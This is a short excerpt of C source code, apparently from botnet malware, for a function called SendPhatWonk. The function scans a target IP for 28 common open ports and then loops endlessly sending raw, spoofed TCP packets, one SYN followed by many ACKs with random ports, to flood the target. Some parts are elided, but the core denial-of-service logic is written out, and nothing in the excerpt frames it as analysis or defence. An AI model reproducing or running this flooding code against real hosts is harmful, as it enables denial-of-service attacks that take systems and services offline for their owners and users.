CString SendPhatWonk(unsigned long TargetIP, int len, int delay) {
  /* ... OMITTED ... */
  sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0, WSA_FLAG_OVERLAPPED);
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(flag));

  unsigned int port[28] = {1025, 21,   22,   23,   25,   53,   80,
                           81,   88,   110,  113,  119,  135,  137,
                           139,  143,  443,  445,  1024, 1433, 1500,
                           1720, 3306, 3389, 5000, 6667, 8000, 8080};
  /* ... OMITTED ... */
  unsigned int openport[28] = {0, 0, 0};
  /* ... OMITTED ... */
  for (i = 0; i < 28; i++) {
    addr.sin_family = AF_INET; addr.sin_addr.s_addr = TargetIP;
    addr.sin_port = htons(port[i]);
    scansock = socket(AF_INET, SOCK_STREAM, 0);
    int result = connect_no_timeout(scansock, (struct sockaddr *)&addr,
                                    sizeof(struct sockaddr), &working_timeout);
    closesocket(scansock);
    if (result == 0) {openport[i] = port[i]; }
  }
  /* ... OMITTED ... */
  for (;;) {
    for (i = 0; i < 1023; ++i) {/* send 1 syn packet + 1023 ACK packets. */
      if (i == 0) {
        packet.tcp.src = htons(brandom(0, 65535)); packet.tcp.ack = 0;
        cksum.pseudo.saddr = packet.ip.src; packet.tcp.flg = SYN; }
      else { packet.tcp.flg = ACK; packet.tcp.ack = htons(brandom(0, 65535)); }
      ++packet.ip.id;
      ++packet.tcp.seq;
      s_in.sin_port = packet.tcp.dst;
      packet.ip.sum = 0;
      packet.tcp.sum = 0;
      cksum.tcp = packet.tcp;
      packet.ip.sum = checksum((unsigned short *)&packet.ip, 20);
      packet.tcp.sum = checksum((unsigned short *)&cksum, sizeof(cksum));
      sendto(sock, (const char *)&packet, sizeof(packet), 0,
             (struct sockaddr *)&s_in, sizeof(s_in));
    }
    /* ... OMITTED ... */
  }
  return hitports;
}
